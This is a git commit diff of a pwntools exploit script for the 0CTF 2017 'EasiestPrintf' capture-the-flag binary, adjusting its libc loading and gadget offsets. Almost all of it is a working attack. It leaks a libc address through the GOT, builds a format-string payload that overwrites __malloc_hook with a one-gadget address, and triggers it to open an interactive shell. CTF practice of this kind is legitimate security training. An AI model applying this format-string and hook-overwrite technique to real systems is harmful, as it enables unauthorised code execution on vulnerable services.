685aca1b2839d2899898e79e2b2f45eb875f0f78
0x01f <aboultraman@gmail.com>
2018-07-29 13:38:05 +0800

    use malloc/free in printf/scanf

--- 0ctf2017_EasiestPrintf/exp.py
+++ 0ctf2017_EasiestPrintf/exp.py
@@ -11,14 +11,9 @@ context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 elf = ELF("./EasiestPrintf")
 if sys.argv[1] == "l":
     context.log_level = "debug"
-    io = process("./EasiestPrintf")
-    libc = elf.libc
-    oneGadget = 0x3a9fc
-    #  oneGadget = 0x3a9fe
-    #  oneGadget = 0x3aa02
-    #  oneGadget = 0x3aa09
-    #  oneGadget = 0x5f7a5
-    #  oneGadget = 0x5f7a6
+    io = process("./EasiestPrintf", env = {"LD_PRELOAD": "./libc_so"})
+    libc = ELF("./libc_so")
+    oneGadget = 0x3ac5c
 
 
 else:
@@ -30,11 +25,6 @@ else:
     io = remote("localhost", 9999)
     libc = ELF("./libc_so")
     oneGadget = 0x3ac5c
-    oneGadget = 0x3ac5e
-    oneGadget = 0x3ac62
-    oneGadget = 0x3ac69
-    oneGadget = 0x5fbc5
-    oneGadget = 0x5fbc6
 
 
 def DEBUG(cmd = ""):
@@ -45,18 +35,17 @@ if __name__ == "__main__":
     io.sendlineafter(":\n", str(elf.got['printf']))
     libc.address = int(io.recvuntil("\n", drop = True), 16) - libc.sym['printf']
     success("libc.address -> {:#x}".format(libc.address))
-    pause()
+    #  pause()
 
     mallocHook = libc.sym['__malloc_hook']
     freeHook = libc.sym['__free_hook']
     oneGadget = libc.address + oneGadget
+    success("oneGadget -> {:#x}".format(oneGadget) )
 
-    payload = fmtstr_payload(7, {mallocHook: oneGadget}, write_size = 'int')
-    payload += "%10000c"
+    payload = fmtstr_payload(7, {mallocHook: oneGadget})
+    payload += "%100000c"
+    #  DEBUG("b *0x804881C\nc")
     io.sendline(payload)
     
     io.interactive()
     io.close()
-
-
-
